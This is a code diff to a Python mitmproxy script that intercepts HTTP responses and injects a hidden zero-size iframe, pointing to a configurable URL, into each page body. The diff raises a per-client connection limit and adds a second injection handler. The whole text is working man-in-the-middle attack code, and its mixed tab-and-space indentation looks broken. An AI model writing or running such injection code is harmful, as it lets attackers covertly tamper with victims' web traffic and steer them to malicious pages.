@@ -3,7 +3,7 @@ from libmproxy import controller, proxy, platform
 import os
 import sys
 hostList = []
-maxConn = 2
+maxConn = 3
 
 class InjectingMaster(controller.Master):
     def __init__(self, server, iframe_url):
@@ -27,20 +27,25 @@ class InjectingMaster(controller.Master):
 		if host==ip:
 			count+=1
 	return count
+    def handle_response2(self, msg):
+        if msg.content:
+            c = msg.replace('<body>', '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % self._iframe_url)
+            if c > 0:
+	        hostIP = str(msg.request.client_conn).split(':')[0]	
+	        print 'Iframe injected! :'+hostIP
+        msg.reply()
 
     def handle_response(self, msg):
         if msg.content:
 	    hostIP = str(msg.request.client_conn).split(':')[0]	
-	    result = checkHostinList(self,hostIP)
-            if result<=maxConn:
-		print "Total connections from "+str(hostIP)+": "+str(result)
-		hostList.append(hostIP)
-    
-                c = msg.replace('<body>', '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % self._iframe_url)
-                if c > 0:
-			hostIP = str(msg.request.client_conn).split(':')[0]	
+	    result = self.checkHostinList(hostIP)
+	    if result<=maxConn:
+	        c = msg.replace('<body>', '<body><iframe src="%s" frameborder="0" height="0" width="0"></iframe>' % self._iframe_url)
+            	if c > 0:
+		     	print "Total connections from "+str(hostIP)+": "+str(result)
+		    	hostList.append(hostIP)
 	        	print 'Iframe injected! :'+hostIP
-            msg.reply()
+        msg.reply()
 
 
 def main(argv):
